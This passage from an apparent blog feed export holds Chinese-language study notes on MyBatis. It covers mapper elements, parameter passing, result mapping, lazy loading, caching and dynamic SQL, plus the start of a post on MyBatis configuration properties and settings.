<p>ASM 是一个 Java 字节码操控框架。它能够以二进制形式修改已有类或者动态生成类。不过ASM在创建class字节码的过程中，操纵的级别是底层JVM的汇编指令级别，这要求ASM使用者要对class组织结构和JVM汇编指令有一定的了解。另外可以使用javassist框架操作字节码，它对开发者提供的接口比较优化。</p>
</blockquote>
<p>了解了反射和动态代理，对后面介绍MyBatis的解析和运行原理有很大帮助，下一篇会重点介绍。</p>
<p><strong>欢迎扫描下方二维码，关注我的个人微信公众号 ~</strong></p>
<p><div align="center"><br><img src="http://upload-images.jianshu.io/upload_images/115629-5a140433dc5e61ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="情情说"></div></p>
]]></content>
      
        <categories>
            
            <category> MyBatis </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 动态代理 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[深入浅出MyBatis：「映射器」全了解]]></title>
      <url>https://qqdong.github.io/2018/03/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAMyBatis%EF%BC%9A%E3%80%8C%E6%98%A0%E5%B0%84%E5%99%A8%E3%80%8D%E5%85%A8%E4%BA%86%E8%A7%A3/</url>
      <content type="html"><![CDATA[<blockquote>
<p>本篇文章是「深入浅出MyBatis：技术原理与实践」书籍的总结笔记。</p>
</blockquote>
<p>上一篇总结了MyBatis的配置，详细说明了各个配置项，其中提到了映射器，它是MyBatis最强大的工具，也是使用最多的工具。</p>
<p>通过映射器，可以很容易的进行数据的增删改查操作，我们抽象下进行这些操作的关键点：传递查询参数、组装各种场景下的查询条件、关联查询、将查询结果映射为Java Bean对象或集合等。另外，可以通过延迟加载、缓存提高数据查询的性能。</p>
<p>本篇就按照这个思路进行总结，首先列举下映射器的主要元素，每个元素提供的配置项和作用，然后重点介绍参数、结果映射、延迟加载、缓存、动态SQL等功能。</p>
<h4 id="映射器的主要元素"><a href="#映射器的主要元素" class="headerlink" title="映射器的主要元素"></a>映射器的主要元素</h4><p>映射器是由Java接口和XML文件（或注解）共同组成的，Java接口主要定义调用者接口，XML文件是配置映射器的核心文件，包括以下元素：</p>
<ul>
<li>select 查询语句，可以自定义参数，返回结果集；</li>
<li>insert 插入语句，返回一个整数，表示插入的条数；</li>
<li>update 更新语句，返回一个整数，表示更新的条数；</li>
<li>delete 删除语句，返回一个整数，表示删除的条数；</li>
<li>sql 允许定义一部分SQL，然后再各个地方引用；</li>
<li>resultMap 用来描述从数据库结果集中来加载对象，还可以配置关联关系；</li>
<li>cache 给定命名空间的缓存配置；</li>
</ul>
<a id="more"></a>
<h4 id="增、删、改、查操作"><a href="#增、删、改、查操作" class="headerlink" title="增、删、改、查操作"></a>增、删、改、查操作</h4><h5 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h5><p>执行select语句前，需要定义参数，执行后，也提供了强大的映射规则或自动映射，将返回的结果集绑定到java bean中。</p>
<p>select元素有很多配置项，下面简单说明下：</p>
<ul>
<li>paramterType：传入的参数类型，可以是基本类型、map、自定义的java bean；</li>
<li>resultType：返回的结果类型，可以是基本类型、自定义的java bean；</li>
<li>resultMap：它是最复杂的元素，可以配置映射规则、级联、typeHandler等，与ResultType不能同时存在；</li>
<li>flushCache：在调用SQL后，是否要求清空之前查询的本地缓存和二级缓存，主要用于更新缓存，默认为false；</li>
<li>useCache：启动二级缓存的开关，默认只会启动一级缓存；</li>
<li>timeout：设置超时参数，等超时的时候将抛出异常，单位为秒；</li>
<li>fetchSize：获取记录的总条数设定；</li>
</ul>
<p>比如根据米聊号获取用户信息：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=<span class="string">"findByMiliao"</span> parameterType=<span class="string">"string"</span> resultType=<span class="string">"User"</span>&gt;</span><br><span class="line">		select</span><br><span class="line">		u.*</span><br><span class="line">		from mxt_user u</span><br><span class="line">		where u.miliao=#&#123;miliao&#125;</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure>
<p>上一篇介绍配置时，有个设置项autoMappingBehavior，默认为自动映射没有定义嵌套结果集映射的结果集；还有设置项mapUnderscoreToCamelCase，设置为true时，会自动将以「下划线」命名的数据库字段名，自动映射为以「驼峰式」命名的POJO。</p>
<p>传递多个参数时，有3种方式：</p>
<ul>
<li>使用Map参数；</li>
<li>使用注解方式传递；</li>
<li>使用java bean；</li>
</ul>
<p>使用注解方式如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Role&gt; <span class="title">findRoleByNameAndNote</span><span class="params">(@Param(<span class="string">"roleName"</span>)</span> String rolename,</span></span><br><span class="line"><span class="function">@<span class="title">Param</span><span class="params">(<span class="string">"note"</span>)</span> String note)</span>;</span><br></pre></td></tr></table></figure>
<p>使用Map传递参数，会导致业务可读性丧失，导致以后扩展和维护不方便，不建议；如果参数个数&lt;=5，建议使用注解的方式，因为过多参数将给调用者带来困难；如果参数个数&gt;5，建议使用JavaBean方式；</p>
<p>使用resultMap映射结果集，后面会单独介绍。</p>
<h5 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h5><p>属性和select大部分都相同， 说下3个不同的属性：</p>
<ul>
<li>keyProperty：指定哪个列是主键，如果是联合主键可以用逗号隔开；</li>
<li>keyColumn：指定第几列是主键，不能和keyProperty共用；</li>
<li>useGeneratedKeys：是否使用自动增长，默认为false；</li>
</ul>
<p>当useGeneratedKeys设为true时，在插入的时候，会回填Java Bean的id值，通过返回的对象可获取主键值。</p>
<p>如果想根据一些特殊关系设置主键的值，可以在insert标签内使用selectKey标签，比如：如果t_role没有记录，则需要设置为1，否则取最大id加2：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">"insertRole"</span> <span class="attr">useGeneratedKeys</span>=<span class="string">"true"</span> <span class="attr">keyProperty</span>=<span class="string">"id"</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">selectKey</span> <span class="attr">keyProperty</span>=<span class="string">"id"</span> <span class="attr">resultType</span>=<span class="string">"int"</span> <span class="attr">order</span>=<span class="string">"before"</span>&gt;</span></span><br><span class="line">        select if(max(id) is null,1,max(id)+2) as newId from t_role</span><br><span class="line">    <span class="tag">&lt;/<span class="name">selectKey</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="update和delete"><a href="#update和delete" class="headerlink" title="update和delete"></a>update和delete</h5><p>比较简单，就不过多介绍了。</p>
<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p>上面已经介绍了参数传递，另外可以指定参数的类型去让对应的typeHandler处理它们。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;age , javaType=int , jdbcType=NUMERIC &#125;</span><br></pre></td></tr></table></figure>
<p>还可以对一些数值型的参数设置其保存的精度</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;price, javaType=double , jdbcType=NUMERIC , numericScale=2 &#125;</span><br></pre></td></tr></table></figure>
<p>一般都是传递字符串，设置的参数#{name}大部分情况下，会创建预编译语句，但有时候传递的是SQL语句本身，不是需要的参数，可以通过$符号表示，比如传递参数columns为”col1,col2,col3”，可以写成下面语句：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select $&#123;columns&#125; from t_tablename</span><br></pre></td></tr></table></figure>
<p>但要注意sql的安全性，防止sql注入。</p>
<h4 id="sql元素"><a href="#sql元素" class="headerlink" title="sql元素"></a>sql元素</h4><p>定义：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sql</span> <span class="attr">id</span>=<span class="string">"role_columns"</span>&gt;</span></span><br><span class="line">    id,role_name,note</span><br><span class="line"><span class="tag">&lt;/<span class="name">sql</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">"role_columns"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prefix"</span> <span class="attr">value</span>=<span class="string">"r"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="结果映射"><a href="#结果映射" class="headerlink" title="结果映射"></a>结果映射</h4><h5 id="元素介绍"><a href="#元素介绍" class="headerlink" title="元素介绍"></a>元素介绍</h5><p>resultMap是MyBatis里面最复杂的元素，它的作用是定义映射规则、级联的更新、定制类型转换器等。</p>
<p>由以下元素构成：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resultMap</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor</span>&gt;</span> <span class="comment">&lt;!-- 配置构造方法 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">idArg</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">arg</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">constructor</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>/&gt;</span> <span class="comment">&lt;!--指明哪一列是主键--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span>/&gt;</span> <span class="comment">&lt;!--配置映射规则--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">association</span>/&gt;</span> <span class="comment">&lt;!--一对一--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">collection</span>/&gt;</span> <span class="comment">&lt;!--一对多--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">discriminator</span>&gt;</span> <span class="comment">&lt;!--鉴别器级联--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">case</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">discriminator</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>有的实体不存在没有参数的构造方法，需要使用constructor配置有参数的构造方法：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">"role"</span> <span class="attr">type</span>=<span class="string">"com.xiaomi.kfs.mcc.core.domain.Role"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">idArg</span> <span class="attr">column</span>=<span class="string">"id"</span> <span class="attr">javaType</span>=<span class="string">"int"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">arg</span> <span class="attr">column</span>=<span class="string">"role_name"</span> <span class="attr">javaType</span>=<span class="string">"string"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">constructor</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>id指明主键列，result配置数据库字段和POJO属性的映射规则：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">"role"</span> <span class="attr">type</span>=<span class="string">"com.xiaomi.kfs.mcc.core.domain.Role"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">"id"</span> <span class="attr">column</span>=<span class="string">"id"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"roleName"</span> <span class="attr">column</span>=<span class="string">"role_name"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"note"</span> <span class="attr">column</span>=<span class="string">"note"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>association、collection用于配置级联关系的，分别为一对一和一对多，实际中，多对多关系的应用不多，因为比较复杂，会用一对多的关系把它分解为双向关系。</p>
<p>discriminator用于这样一种场景：比如我们去体检，男和女的体检项目不同，如果让男生去检查妇科项目，是不合理的， 通过discriminator可以根据性别，返回不同的对象。</p>
<p>级联关系的配置比较多，就不在此演示了，可查看文档进行了解。</p>
<h5 id="延迟加载"><a href="#延迟加载" class="headerlink" title="延迟加载"></a>延迟加载</h5><p>级联的优势是能够方便地获取数据，但有时不需要获取所有数据，这样会多执行几条SQL，性能下降，为了解决这个问题，需要使用延迟加载，只要使用相关级联数据时，才会发送SQL去取回数据。</p>
<p>在MyBatis的配置中有2个全局的参数 lazyLoadingEnabled 和 aggressiveLazyLoading ，第一个的含义是是否开启延迟加载功能，第二个的含义是对任意延迟加载属性的调用，会使延迟加载的对象完整加载，否则只会按需加载。</p>
<p>再理解下aggressiveLazyLoading属性，比如学生对象的关联对象如下：</p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15221535775297.jpg" alt=""></p>
<p>当访问学生信息的时候，会根据鉴别器把健康的情况也会查找出来；当访问课程成绩的时候，同时也会把学生证信息查找出来，因为在默认情况下，MyBatis是按层级延迟加载的。 但这不是我们需要的，并不希望在访问成绩的时候，去加载学生证的信息，可以设置aggressiveLazyLoading为false，按需进行延迟加载数据。</p>
<p>上面的2个属性都是全局设置，也可以在association和collection元素上加上属性值fetchType，它有两个取值eager和lazy。</p>
<h4 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h4><p>在没有显示配置缓存时，只开启一级缓存，一级缓存是相对于同一个SqlSession而言的，在参数和SQL完全一样的情况下，使用同一个SqlSession对象调用同一个Mapper的方法，只会执行一次SQL。</p>
<p>如果是不同的SqlSession对象，因为不同SqlSession是相互隔离的，即使用相同的Mapper、参数和方法，还是会再次发送SQL到数据库去执行。</p>
<p>二级缓存是SqlSessionFactory层面上的，需要进行显示配置，实现二级缓存的时候，要求POJO必须是可序列化的，只需要简单配置即可：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">cache</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>这样很多设置是默认的，有如下属性可以配置：</p>
<ul>
<li>eviction：代表缓存回收策略，可选值有LRU最少使用、FIFO先进先出、SOFT软引用，WEAK弱引用；</li>
<li>flushInterval：刷新间隔时间，单位为毫秒，如果不配置，当SQL被执行时才会刷新缓存；</li>
<li>size：引用数目，代表缓存最多可以存储多少对象，不宜设置过大，设置过大会导致内存溢出；</li>
<li>readOnly：只读，意味着缓存数据只能读取不能修改；</li>
</ul>
<p>在大型服务器上，可能会使用专用的缓存服务器，比如Redis缓存，可以通过实现org.apache.ibatis.cache.Cache接口很方便的实现：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Cache</span> </span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">getId</span><span class="params">()</span></span>; <span class="comment">//缓存编号</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">putObject</span><span class="params">(Object var1, Object var2)</span></span>; <span class="comment">//保存对象</span></span><br><span class="line">    <span class="function">Object <span class="title">getObject</span><span class="params">(Object var1)</span></span>; <span class="comment">//获取对象</span></span><br><span class="line">    <span class="function">Object <span class="title">removeObject</span><span class="params">(Object var1)</span></span>; <span class="comment">//移除对象</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span>; <span class="comment">//清空缓存</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>; <span class="comment">//获取缓存对象大小</span></span><br><span class="line">    <span class="function">ReadWriteLock <span class="title">getReadWriteLock</span><span class="params">()</span></span>; <span class="comment">//获取缓存的读写锁</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="动态SQL"><a href="#动态SQL" class="headerlink" title="动态SQL"></a>动态SQL</h4><p>很多时候，需要根据不同的场景组装查询条件，MyBatis提供对SQL语句动态的组装能力。</p>
<p>主要提供以下几种元素：</p>
<ul>
<li>if：判断语句，但条件分支判断；</li>
<li>choose (when、otherwise)：多条件分支判断；</li>
<li>trim (where、set)：处理一些SQL拼装问题；</li>
<li>foreach：循环语句，在in语句等列举条件常用；</li>
<li>bind：通过OGNL表达式去自定义一个上下文变量，可以方便使用；</li>
</ul>
<p>trim可以处理 and 和 逗号 拼接的问题，举例如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"findRoles"</span> <span class="attr">parameterType</span>=<span class="string">"string"</span> &gt;</span></span><br><span class="line">  select id,role_name,note from t_role</span><br><span class="line">  <span class="tag">&lt;<span class="name">trim</span> <span class="attr">prefix</span>=<span class="string">"where"</span> <span class="attr">prefixOverrides</span>=<span class="string">"and"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"roleName!=null and roleName!=''"</span>&gt;</span></span><br><span class="line">        and role_name like concat('%',#&#123;roleName&#125;,'%')</span><br><span class="line">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">trim</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>另外，可以使用set元素设置更新的字段列表：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">"updateRole"</span> <span class="attr">parameterType</span>=<span class="string">"role"</span>&gt;</span></span><br><span class="line">    update t_role</span><br><span class="line">    <span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"roleName!=null and roleName!=''"</span>&gt;</span></span><br><span class="line">            role_name=#&#123;roleName&#125;,</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"note!=null and note!=''"</span>&gt;</span></span><br><span class="line">            note=#&#123;note&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line">    where id=#&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">update</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>下一篇会介绍MyBatis的解析和运行原理。</p>
<p><strong>欢迎扫描下方二维码，关注我的个人微信公众号 ~</strong></p>
<p><div align="center"><br><img src="http://upload-images.jianshu.io/upload_images/115629-5a140433dc5e61ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="情情说"></div></p>
]]></content>
      
        <categories>
            
            <category> MyBatis </category>
            
        </categories>
        
        
        <tags>
            
            <tag> MyBatis </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[深入浅出MyBatis：MyBatis的所有配置]]></title>
      <url>https://qqdong.github.io/2018/03/26/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAMyBatis%EF%BC%9AMyBatis%E7%9A%84%E9%85%8D%E7%BD%AE/</url>
      <content type="html"><![CDATA[<p>上一篇介绍了JDBC的相关概念、MyBatis的特性与Hibernate的区别、MyBatis的基本组件与生命周期，基本可以使用MyBatis了。</p>
<p>这一篇详细介绍MyBatis的配置，首先看下配置XML文件的层次结构，然后详细介绍每个配置项，说明每项的作用，值的取值与含义。</p>
<p>下面列出MyBatis配置XML文件的层次结构，这些层次是不能够颠倒顺序的。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;  </span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>/&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">settings</span>/&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">typeAliases</span>/&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">typeHandles</span>/&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">objectFactory</span>/&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>/&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">environments</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">environment</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">transanctionManager</span>/&gt;</span> <span class="comment">&lt;!-- 配置事务管理器 --&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">dataSource</span>/&gt;</span> <span class="comment">&lt;!-- 配置数据源 --&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">environment</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">environments</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="tag">&lt;<span class="name">databaseIdProvider</span>/&gt;</span> <span class="comment">&lt;!-- 数据库厂商标识 --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">mappers</span>/&gt;</span> <span class="comment">&lt;!-- 映射器 --&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h4 id="properties元素"><a href="#properties元素" class="headerlink" title="properties元素"></a>properties元素</h4><p>将一些公用、经常变更的值单独声明，能在配置文件的上下文中使用它，MyBatis提供了3种配置方式：</p>
<ul>
<li>property子元素</li>
<li>properties配置文件</li>
<li>程序参数传递</li>
</ul>
<h5 id="property子元素"><a href="#property子元素" class="headerlink" title="property子元素"></a>property子元素</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"driver"</span> <span class="attr">value</span>=<span class="string">"com.mysql.jdbc.Driver"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"url"</span> <span class="attr">value</span>=<span class="string">"jdbc:mysql://localhost:3306/mi-user"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"root"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"pwd"</span> <span class="attr">value</span>=<span class="string">"123456"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="properties配置文件"><a href="#properties配置文件" class="headerlink" title="properties配置文件"></a>properties配置文件</h5><p>创建一个配置文件 jdbc.properties</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">driver = com.mysql.jdbc.Driver</span><br><span class="line">url = jdbc:mysql://localhost:3306/mi-user</span><br><span class="line">username = root</span><br><span class="line">password = 123456</span><br></pre></td></tr></table></figure>
<p>设置properties配置文件</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span> <span class="attr">resource</span>=<span class="string">'jdbc.properties'</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="程序参数传递"><a href="#程序参数传递" class="headerlink" title="程序参数传递"></a>程序参数传递</h5><p>实际工作中，会遇到这种场景：系统由运维人员配置，生成数据库的密码对开发者是保密的，对用户名和密码进行了加密。可以通过程序参数传递的方式，先解密，再设置property。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//读入配置文件流</span></span><br><span class="line">InputStream cfgStream = Resources.getResourceAsStream(<span class="string">"mybatis-config.xml"</span>);</span><br><span class="line">Reader cfgReader = <span class="keyword">new</span> InputStreamReader(cfgStream);</span><br><span class="line"></span><br><span class="line"><span class="comment">//读入属性文件流</span></span><br><span class="line">InputStream proStream = Resources.getResourceAsStream(<span class="string">"jdbc.properties"</span>);</span><br><span class="line">Reader proReader = <span class="keyword">new</span> InputStreamReader(proStream);</span><br><span class="line"></span><br><span class="line">Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line">properties.load(proReader);</span><br><span class="line"><span class="comment">//转换为明文</span></span><br><span class="line">properties.setProperty(<span class="string">"username"</span>,decode(properties.getProperty(<span class="string">"username"</span>)));</span><br><span class="line">properties.setProperty(<span class="string">"pwd"</span>,decode(properties.getProperty(<span class="string">"pwd"</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建sqlSessionFactory</span></span><br><span class="line">SqlSessionFactory sqlSessionFactory=<span class="keyword">new</span> SqlSessionFactoryBuilder().build(cfgReader,properties);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>如果3种配置同时出现，优先级为第3种 &gt; 第2种 &gt; 第1种，推荐使用第2种，有特殊需求时使用第3种。</p>
</blockquote>
<h4 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h4><p>设置会改变MyBatis运行时的行为，设置项很多，只会介绍常用的配置，想了解全部配置可以查看官方文档。</p>
<ul>
<li>cacheEnabled，全局地开启或关闭配置文件中的所有映射器已经配置的任何缓存，默认为true；</li>
<li>lazyLoadingEnabled，延迟加载的全局开关，当开启时，所有关联对象都会延迟加载，特定关联关系中可通过设置fetchType属性来覆盖该项的开关状态，默认为false；</li>
<li>aggressiveLazyLoading，当开启时，任何方法的调用都会加载该对象的所有属性。否则，每个属性会按需加载，3.4.1版本之前默认为true，3.4.1之后默认为false；</li>
<li>autoMappingBehavior，指定MyBatis应如何自动映射列到字段或属性，NONE 表示取消自动映射，PARTIAL 只会自动映射没有定义嵌套结果集映射的结果集，FULL 会自动映射任意复杂的结果集，默认为PARTIAL；</li>
